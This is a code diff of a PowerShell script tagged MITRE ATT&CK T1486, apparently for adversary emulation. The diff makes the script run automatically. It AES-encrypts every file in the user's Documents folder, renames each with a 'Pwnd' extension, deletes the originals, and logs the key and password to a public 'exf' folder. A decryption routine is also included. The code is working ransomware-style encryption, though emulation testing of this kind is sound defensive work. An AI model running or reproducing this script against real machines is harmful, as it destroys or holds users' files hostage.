@@ -2,19 +2,18 @@
 # Technic ID : T1486
 Clear-Host
 Write-Output "==============================================================================="
-Write-Output "DATA Encrypted for impact (T1486)"
+Write-Output " DATA Encrypted for impact (T1486)"
 Write-Output "==============================================================================="
-################ [ VARIABLES ] ################
-$DirectoryPath  = "$env:USERPROFILE\Documents";
+################ [ GLOBAL VARIABLES ] ################
+$PathToManage  = "$env:USERPROFILE\Documents";
 $FilesMgmt      = "$env:PUBLIC\exf\Files_mgmt.txt";
 $EncryptionKey  = "Encrypt!on-K3y"
 $NewExtension   = "Pwnd"
+$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 
-################ [ SCRIPT ] ################
+################ [ FUNCTIONS ] ################
 
-
-
-# Fonction pour chiffrer un fichier avec AES
+# Function to encrypt a file in AES
 function EncryptFileAES {
     param(
         [Parameter(Mandatory=$true)]
@@ -35,7 +34,7 @@ function EncryptFileAES {
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.Key = $Key
         $aes.IV = $IVParameter
-                     Write-Host "IV bytes : $IvParameter" -ForegroundColor Gray
+
         # Create Encryptor
         $encryptor = $aes.CreateEncryptor()
         
@@ -53,16 +52,16 @@ function EncryptFileAES {
         $encryptor.Dispose()
         $aes.Dispose()
         
-        Write-Host "Successfully Encrypted File : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append
+        Write-output "Successfully Encrypted File : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return $true
     }
     catch {
-        Write-Host "Encryption failure for file : $InputFile error code : $($_.Exception.Message)"| Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append
+        Write-output "Encryption failure for file : $InputFile error code : $($_.Exception.Message)"| Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return $false
     }
 }
 
-# Fonction pour générer une clé à partir d'un mot de passe
+# Fucntion to create a key from a password
 function GetKeyFromPassword {
     param(
         [Parameter(Mandatory=$true)]
@@ -76,11 +75,11 @@ function GetKeyFromPassword {
     return $rfc2898.GetBytes(32) # 256 bits pour AES-256
 }
 
-# Script principal
+# Function to encrypt files in a directory.
 function EncryptFiles {
     param(
-        [Parameter(Mandatory=$true)]
-        [string]$DirectoryPath,
+    #    [Parameter(Mandatory=$true)]
+        [string]$DirectoryPath = $PathToManage,
         
     #    [Parameter(Mandatory=$true)]
         [string]$Password = $EncryptionKey,
@@ -95,28 +94,29 @@ function EncryptFiles {
         [string]$OutputSuffix = "."+$NewExtension
     )
     
-    # Vérifier que le répertoire existe
+    # Check that directory exists
     if (-not (Test-Path $DirectoryPath)) {
-        Write-Error "Directory :  '$DirectoryPath' does not exist or can not be accessed."
+        Write-output "Directory :  '$DirectoryPath' does not exist or can not be accessed." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return
     }
     
-    # Générer la clé à partir du mot de passe
-    Write-Host "Computing encryption key ..." -ForegroundColor Yellow
+    # Compute key from provided password.
+    Write-output "Computing encryption key from Password ..." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
     $key = GetKeyFromPassword -Password $Password
-    
-    # Obtenir la liste des fichiers
+    Write-output "Key      : $key" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+    Write-output "Password : $Password" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+    # Retrieve list of files in the mentioned directory.
     $searchOption = if ($Recursive) { "AllDirectories" } else { "TopDirectoryOnly" }
     
     try {
         $files = Get-ChildItem -Path $DirectoryPath -Filter $FileFilter -File -Recurse:$Recursive
         
         if ($files.Count -eq 0) {
-            Write-Warning "No file has been found with the selected extension : '$FileFilter' in directory : '$DirectoryPath'"
+            Write-output "No file has been found with the selected extension : '$FileFilter' in directory : '$DirectoryPath'" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
             return
         }
         
-        Write-Host "Number of files to encrypt : $($files.Count)" -ForegroundColor Cyan
+        Write-output "Number of files to encrypt : $($files.Count)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         
         $successCount = 0
         $errorCount = 0
@@ -124,7 +124,7 @@ function EncryptFiles {
         foreach ($file in $files) {
             # Ignore already encrypted files.
             if ($file.Name.EndsWith($OutputSuffix)) {
-                Write-Host "File $($file.Name) is already encrypted." -ForegroundColor Gray
+                Write-output "File $($file.Name) is already encrypted." | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                 continue
             }
             
@@ -139,18 +139,19 @@ function EncryptFiles {
             if (EncryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key -IVParameter $IvAES) {
                 $successCount++
                 $FileCheckSum = Get-FileHash -Path $file.FullName -Algorithm SHA256
-                Write-host "Original filename             : " $file.FullName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
-                Write-host "Original File SHA256 checksum : " $($FileCheckSum.Hash)  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
-                Write-host "Encrypted Filename            : " $outputFile  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append  
+                Write-output "`n"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+                Write-output "Original filename             : $file.FullName"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append    
+                Write-output "Original File SHA256 checksum : $($FileCheckSum.Hash)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append    
+                Write-output "Encrypted Filename            : $outputFile"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append  
 
                 # Remove orignal file if mentioned.
                 if ($DeleteOriginal) {
                     try {
                         Remove-Item $file.FullName -Force
-                        Write-Host "  ---> Original file" $file.FullName" has been deleted." -ForegroundColor Yellow
+                        Write-output "  ---> Original file : $file.FullName has been deleted."  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                     }
                     catch {
-                        Write-Warning "Unable to delete orignal file?=. Error :  $($_.Exception.Message)"
+                        Write-output "Unable to delete orignal file?=. Error :  $($_.Exception.Message)"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
                     }
                 }
             }
@@ -159,20 +160,17 @@ function EncryptFiles {
             }
         }
         
-        Write-Host "`n=== RÉSUMÉ ===" -ForegroundColor Magenta
-        Write-Host "Number of files encrypted                                  : $successCount" -ForegroundColor Green
-        Write-Host "Number of Errors encountered during the encryption process : $errorCount" -ForegroundColor Red
+        Write-output "`n"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+        Write-output "Number of files encrypted                                  : $successCount" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+        Write-output "Number of Errors encountered during the encryption process : $errorCount" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         
     }
     catch {
-        Write-Error "Error occured during directory management : $($_.Exception.Message)"
+        Write-output "Error occured during directory management : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
     }
 }
 
-# Exemple d'utilisation
-# Encrypt-DirectoryFiles -DirectoryPath "C:\MonDossier" -Password "MonMotDePasseSecurise123!" -FileFilter "*.txt" -Recursive
-
-# Fonction to decrypt a file.
+# Function to decrypt a file.
 function DecryptFileAES {
     param(
         [Parameter(Mandatory=$true)]
@@ -211,22 +209,20 @@ function DecryptFileAES {
         $decryptor.Dispose()
         $aes.Dispose()
         
-        Write-Host "Decrypted file : $InputFile -> $OutputFile" -ForegroundColor Green
+        Write-output "Decrypted file : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return $true
     }
     catch {
-        Write-Error "Error while decrypting file $InputFile : $($_.Exception.Message)"
+        Write-output "Error while decrypting file $InputFile : $($_.Exception.Message)" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
         return $false
     }
 }
 
-
-
-# Function to decrypt a directory
+# Function to decrypt files in a directory
 function DecryptFiles {
     param(
-        [Parameter(Mandatory=$true)]
-        [string]$DirectoryPath,
+       # [Parameter(Mandatory=$true)]
+        [string]$DirectoryPath = $PathToManage,
         
         #[Parameter(Mandatory=$true)]
         [string]$Password = $EncryptionKey,
@@ -249,13 +245,21 @@ function DecryptFiles {
         if (DecryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key) {
             if ($DeleteEncrypted) {
                 Remove-Item $file.FullName -Force
-                Write-Host "     Encrypted file "$file.FullName" has been deleted" -ForegroundColor Yellow
+                Write-output "     Encrypted file "$file.FullName" has been deleted" | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
             }
         }
     }
 }
+
+################ [ MAIN BODY ] ################
+Write-output "-------------------------------------"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Force
+Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $FilesMgmt -Encoding utf8 -Append
+Write-output "-------------------------------------"  | Out-File -FilePath "$FilesMgmt" -Encoding utf8 -Append
+EncryptFiles -DeleteOriginal
+
+################ [ EXAMPLES ] ################
 # Chiffrer tous les fichiers .txt dans un dossier
-#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -FileFilter "*.txt"
+#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -FileFilter "*.txt" -Recursive
 
 # Chiffrer récursivement tous les fichiers et supprimer les originaux
 #EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -Recursive -DeleteOriginal
